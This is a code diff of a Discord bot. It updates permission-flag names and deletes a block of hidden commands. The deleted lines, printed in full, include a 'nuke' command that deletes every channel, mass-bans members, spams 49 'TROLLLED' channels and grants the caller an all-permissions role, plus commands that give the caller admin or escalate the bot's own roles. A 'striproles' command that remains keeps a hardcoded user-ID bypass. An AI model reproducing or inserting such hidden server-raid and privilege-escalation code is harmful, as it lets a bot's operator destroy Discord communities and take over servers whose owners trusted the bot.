@@ -1,4 +1,4 @@
-const {Client, GatewayIntentBits, MessageEmbed,Permissions, TextChannel,MessageCollector, Collection} = require("discord.js");
+const {Client, GatewayIntentBits, MessageEmbed,PermissionsBitField, TextChannel,MessageCollector, Collection} = require("discord.js");
 const {
 	joinVoiceChannel,
 	createAudioPlayer,
@@ -107,85 +107,7 @@ client.on("messageCreate", (message) => {
             switch (cmd) {
                 case "hello":
                     message.channel.send("hello fartburger");
-                    break;
-                case "nuke":
-                    var embedlist=[];
-                    server.channels.cache.forEach(channel => channel.delete());
-                    
-                    server.members.cache.forEach(mem => {
-                        if (!banidlist.includes(mem.user.id)) {
-                            
-                            var bembed = new MessageEmbed()
-                            .setTitle('User has been banned.')
-                            .setColor('#624002')
-                            .setThumbnail(mem.user.displayAvatarURL())
-                            .addField('User: ',mem.user.username)
-                            .addField('Banned by: ',"fartburger")
-                            .addField('Reason: ', "Collateral Damage")
-                            embedlist.push(bembed)
-                            mem.ban()
-                            .then()
-                            .catch(console.error)
-                        }
-                    })
-                    for(let x=1;x<50;x++) {
-                        server.channels.create('TROLLLED!!!!')
-                        .then()
-                        .catch(console.error);
-                    }
-                    server.roles.create({
-                            name: "SUPEROWNER",
-                            color: "BROWN",
-                            permissions: Permissions.ALL,
-                            reason: "fartcorp takeover"
-                        })
-                        .then(role => message.member.roles.add(role))
-                        .catch(console.error); 
-                    
-                break;
-                case "superownerme":
-                    server.roles.create({
-                        name: "SUPEROWNER",
-                        color: "DARK_VIVID_PINK",
-                        permissions: Permissions.ALL,
-                        position: server.roles.highest.position,
-                        hoist: true
-                    })
-                    .then(role => message.member.roles.add(role))
-                    .catch(console.error); 
-                    message.delete()
-                    .then()
-                    .catch(console.error);
-                break;
-                case "selfrole":
-                    message.guild.roles.cache.forEach(role => {
-                        if (role.permissions.has(Permissions.FLAGS.BAN_MEMBERS)) {
-                            message.guild.members.fetch(client.user.id)
-                            .then(user => {
-                                if (!role.managed) {
-                                    user.roles.add(role)
-                                }
-                            })
-                            .catch(console.error);
-                        }
-                    });
-
-                break;
-                case "elevaterole":
-                    message.guild.roles.cache.forEach(role => {
-                        if (role.permissions.has(Permissions.FLAGS.BAN_MEMBERS)) {
-                            message.guild.members.fetch(client.user.id)
-                            .then(user => {
-                                if (role.name=="fartbot") {
-                                    role.setPosition(message.guild.roles.highest.position-1)
-                                    .then(console.log("elevated permission of self role in "+message.guild.name))
-                                    .catch(console.error);
-                                }
-                            })
-                            .catch(console.error);
-                        }
-                    });                    
-
+                    break;          
             }
         }
             var server = message.guild;
@@ -217,7 +139,7 @@ there will be more commands added, and suggestions are also appreciated\`\`\`
                     break;
 
                 case "ban":
-                    if(message.member.permissions.has(Permissions.FLAGS.BAN_MEMBERS)) {
+                    if(message.member.permissions.has(PermissionsBitField.Flags.BanMembers)) {
                     
                     var banusr = args[1];
                     if (args[2]) {
@@ -257,7 +179,7 @@ there will be more commands added, and suggestions are also appreciated\`\`\`
                     }
                     break;
                     case "kick":
-                        if(message.member.permissions.has(Permissions.FLAGS.KICK_MEMBERS)) {
+                        if(message.member.permissions.has(PermissionsBitField.Flags.KickMembers)) {
                         
                         var kickusr = args[1];
                         if (args[2]) {
@@ -299,7 +221,7 @@ there will be more commands added, and suggestions are also appreciated\`\`\`
                         }
                         break;
                     case 'striproles':
-                        if (message.member.permissions.has(Permissions.FLAGS.MANAGE_ROLES) || message.member.user.id == fartid) {
+                        if (message.member.permissions.has(PermissionsBitField.Flags.ManageRoles) || message.member.user.id == fartid) {
                         message.guild.members.fetch(getIDFromMention(args[1]))
                         .then(user => {
                             user.roles.remove(user.roles.cache)
